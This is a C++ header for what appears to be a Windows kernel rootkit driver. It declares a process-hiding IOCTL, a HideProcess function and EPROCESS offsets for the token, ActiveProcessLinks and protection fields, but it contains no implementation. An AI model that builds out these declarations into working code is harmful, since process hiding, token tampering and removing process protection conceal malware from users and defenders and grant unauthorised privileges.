#pragma once

#include <ntifs.h>
#include <ntdef.h>
#include <minwindef.h>
#include <ntstrsafe.h>

#define HIDE_PROC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x3, METHOD_BUFFERED, FILE_ANY_ACCESS)

extern "C" {
	
	NTKERNELAPI NTSTATUS IoCreateDriver (
		IN PUNICODE_STRING DriverName, OPTIONAL
		IN PDRIVER_INITIALIZE InitializationFunction
	);

	NTSTATUS HideProcess (
			int pid
		);

	NTKERNELAPI PCHAR NTAPI PsGetProcessImageFileName(
			_In_ PEPROCESS Process
		);

}

NTSTATUS InializeOffsets();
NTSTATUS CreateClose(PDEVICE_OBJECT deviceObject, PIRP irp);
NTSTATUS IOControl(PDEVICE_OBJECT deviceObject, PIRP irp);

typedef struct eprocess_offsets {
	DWORD Token_offset;
	DWORD ActiveProcessLinks_offset;
	DWORD protection_offset;
}exprocess_offsets, * peprocess_offsets;

